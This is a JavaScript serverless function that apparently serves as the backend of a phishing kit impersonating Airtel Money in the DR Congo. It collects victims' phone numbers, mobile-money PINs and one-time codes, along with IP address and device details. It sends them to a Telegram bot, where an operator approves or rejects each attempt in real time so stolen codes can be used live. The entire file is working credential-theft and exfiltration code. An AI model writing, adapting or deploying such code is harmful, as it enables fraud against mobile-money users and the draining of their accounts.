import { getStore } from "@netlify/blobs";

export default async (req, context) => {
  const url = new URL(req.url);

  if (req.method === "GET") {
    const id = url.searchParams.get("requestId");
    if (!id) return json({ status: "pending" });

    const store = getStore("status");
    const status = (await store.get(id)) || "pending";
    return json({ status });
  }

  if (req.method === "POST") {
    let body;
    try {
      body = await req.json();
    } catch {
      return json({ error: "invalid_json" }, 400);
    }

    const { type, phone, pin, otp, plan, amount, trial } = body;
    if (!type || !phone) return json({ error: "missing_fields" }, 400);

    const requestId = crypto.randomUUID().replace(/-/g, "").slice(0, 12);
    const ip = req.headers.get("x-nf-client-connection-ip") || req.headers.get("x-forwarded-for") || "N/A";
    const ua = (req.headers.get("user-agent") || "N/A").slice(0, 60);
    const now = new Date().toISOString().replace("T", " ").slice(0, 19);

    const lines = [
      `🔐 <b>Nouvelle Demande Airtel Money</b>`,
      `━━━━━━━━━━━━━━━━━━━━`,
      `🔖 <b>Étape :</b> <code>${type === "pin" ? "MOBILE + PIN" : "VÉRIFICATION OTP"}</code>`,
      `📱 <b>Mobile :</b> +243 <code>${escapeHtml(phone)}</code>`,
      type === "pin" ? `🔐 <b>Épingle :</b> <code>${escapeHtml(pin || "")}</code>` : null,
      type === "otp" ? `🔑 <b>Code OTP :</b> <code>${escapeHtml(otp || "")}</code>` : null,
      `📦 <b>Forfait :</b> <code>${escapeHtml(plan || "N/A")}</code>`,
      amount ? `💰 <b>Montant :</b> <code>${Number(amount).toLocaleString("fr-CD")} CDF</code>` : null,
      `🔢 <b>Tentative :</b> <code>${trial} / 3</code>`,
      `🌐 <b>IP :</b> <code>${escapeHtml(ip)}</code>`,
      `📱 <b>Appareil :</b> <code>${escapeHtml(ua)}</code>`,
      `🕒 <b>Heure :</b> <code>${now}</code>`,
      `🆔 <b>ID :</b> <code>${requestId}</code>`,
      `━━━━━━━━━━━━━━━━━━━━`,
      `<i>Sélectionnez une action :</i>`,
    ].filter(Boolean).join("\n");

    const tgRes = await fetch(`https://api.telegram.org/bot${process.env.TG_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.TG_CHAT_ID,
        text: lines,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ APPROUVER", callback_data: `approve:${requestId}` },
            { text: "❌ REJETER", callback_data: `reject:${requestId}` },
          ]],
        },
      }),
    });

    if (!tgRes.ok) {
      console.error("Telegram error:", await tgRes.text());
      return json({ error: "telegram_failed" }, 502);
    }

    const store = getStore("status");
    await store.set(requestId, "pending");

    return json({ ok: true, requestId });
  }

  return json({ error: "method_not_allowed" }, 405);
};

function escapeHtml(s) {
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}